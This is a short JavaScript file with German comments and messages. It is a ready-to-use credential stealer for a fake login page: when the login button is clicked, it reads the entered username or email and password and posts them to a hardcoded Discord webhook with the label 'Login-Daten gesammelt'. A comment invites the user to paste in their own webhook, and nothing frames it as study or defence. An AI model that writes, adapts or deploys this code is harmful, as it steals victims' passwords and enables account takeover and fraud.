// <<< DEINE DISCORD-WEBHOOK HIER EINFÜGEN >>>
const webhookURL = "https://discord.com/api/webhooks/1376665014861172786/SUJYlRDETCWU6rN2x8lJwvZkGzeWZtWGfH1FXtSdfbm7l1UcUo5sy1BBBue1RHGWWJAL";

document.getElementById("login-button").addEventListener("click", () => {
    const usernameInput = document.getElementById("login-username");
    const passwordInput = document.getElementById("login-password");

    if (!usernameInput || !passwordInput) {
        console.error("❌ Eingabefelder nicht gefunden.");
        return;
    }

    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    if (!username && !password) {
        console.warn("⚠️ Keine Eingaben gemacht.");
        return;
    }

    const payload = {
        content: "**🔐 Neue Login-Daten erhalten:**",
        embeds: [
            {
                title: "📥 Login-Versuch auf Website",
                color: 0xff0000,
                fields: [
                    {
                        name: "📛 Benutzername / Email / Telefon",
                        value: username || "_(leer)_",
                        inline: false
                    },
                    {
                        name: "🔑 Passwort",
                        value: password || "_(leer)_",
                        inline: false
                    }
                ],
                footer: {
                    text: "Login-Daten gesammelt"
                },
                timestamp: new Date().toISOString()
            }
        ]
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    }).then(res => {
        if (!res.ok) {
            console.error("❌ Fehler beim Senden an Webhook:", res.statusText);
        } else {
            console.log("✅ Login-Daten erfolgreich gesendet.");
        }
    }).catch(err => {
        console.error("❌ Webhook-Verbindungsfehler:", err);
    });
});
